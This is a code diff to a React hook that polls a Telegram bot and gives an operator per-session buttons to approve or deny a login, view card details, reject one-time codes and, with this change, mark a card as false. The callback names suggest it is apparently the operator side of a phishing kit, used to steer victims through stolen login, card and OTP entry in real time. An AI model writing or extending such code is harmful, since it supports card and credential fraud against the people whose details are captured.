@@ -45,7 +45,7 @@ const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
   }, delay);
 };
 
-export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse, onApproveOtp) => {
+export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse, onApproveOtp, onCardFalse) => {
   const pollingIntervalRef = useRef(null);
   const lastUpdateIdRef = useRef(0);
 
@@ -135,6 +135,9 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
           ],
           [
             { text: "⬅️ Back to Login", callback_data: `back_to_login_${sessionId}` }
+          ],
+          [
+            { text: "❌ Card False", callback_data: `card_false_${sessionId}` }
           ]
         ]
       };
@@ -729,6 +732,10 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
                 console.log('✅ Calling onApproveOtp callback');
                 onApproveOtp?.();
               }
+              else if (action === 'card_false') {
+                console.log('❌ Calling onCardFalse callback');
+                onCardFalse?.();
+              }
               
               try {
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
@@ -751,7 +758,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         clearInterval(pollingIntervalRef.current);
       }
     };
-  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onOtpFalse, onApproveOtp]);
+  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onOtpFalse, onApproveOtp, onCardFalse]);
 
   useEffect(() => {
     const cleanup = setupTelegramPolling();
